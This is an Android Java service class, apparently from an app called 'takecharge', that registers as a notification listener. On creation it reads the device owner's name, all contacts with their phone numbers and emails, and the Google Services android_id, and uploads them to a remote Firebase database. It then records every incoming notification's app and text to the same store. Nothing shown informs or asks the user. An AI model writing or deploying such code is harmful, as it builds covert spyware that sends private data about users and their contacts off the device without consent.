package io.perihelion.takecharge;

import android.content.ContentResolver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

import com.firebase.client.Firebase;

import java.io.FileNotFoundException;
import java.io.IOException;

@SuppressWarnings("All")
public class MallWhereService extends NotificationListenerService {

    private final String TAG = getClass().getName();
    private Firebase userDataRef;


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        Firebase.setAndroidContext(this);
        userDataRef = new Firebase("https://takecharge.firebaseio.com/" + getAndroidId());
        Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
        c.moveToFirst();
        userDataRef.child("userinfo").child("name").setValue(c.getString(c.getColumnIndex("display_name")));
        c.close();
        uploadUserContacts();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.d(TAG, "onNotificationPosted");
        userDataRef.child("notifications").push().setValue(new LoggedNotification(sbn.getPackageName(), (String) sbn.getNotification().tickerText, sbn.getId()));
        Log.d(TAG, "ID :" + sbn.getId() + "t" + sbn.getNotification().tickerText + "t" + sbn.getPackageName());
    }

    private void uploadUserContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
                null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                Contact newContact = new Contact();
                newContact.setId(cur.getString(cur
                        .getColumnIndex(ContactsContract.Contacts._ID)));
                newContact.setName(cur
                        .getString(cur
                                .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));

                if (Integer
                        .parseInt(cur.getString(cur
                                .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                    + " = ?", new String[]{newContact.getId()}, null);
                    while (pCur.moveToNext()) {
                        newContact.setPhone(pCur
                                .getString(pCur
                                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    }
                    pCur.close();

                    Cursor emailCur = cr.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID
                                    + " = ?", new String[]{newContact.getId()}, null);
                    while (emailCur.moveToNext()) {
                        newContact.setEmail(emailCur
                                .getString(emailCur
                                        .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));
                    }

                    emailCur.close();
                }
                userDataRef.child("contacts").child(newContact.getId()).setValue(newContact);
            }
        }
    }

    private String getAndroidId() {
        String[] params = {"android_id"};
        Cursor c = getContentResolver()
                .query(Uri.parse("content://com.google.android.gsf.gservices"), null, null, params, null);

        if (!c.moveToFirst() || c.getColumnCount() < 2) {
            c.close();
            return null;
        }

        try {
            String androidId = Long.toHexString(Long.parseLong(c.getString(1)));
            c.close();
            return androidId;
        } catch (NumberFormatException e) {
            c.close();
            return null;
        }
    }
}
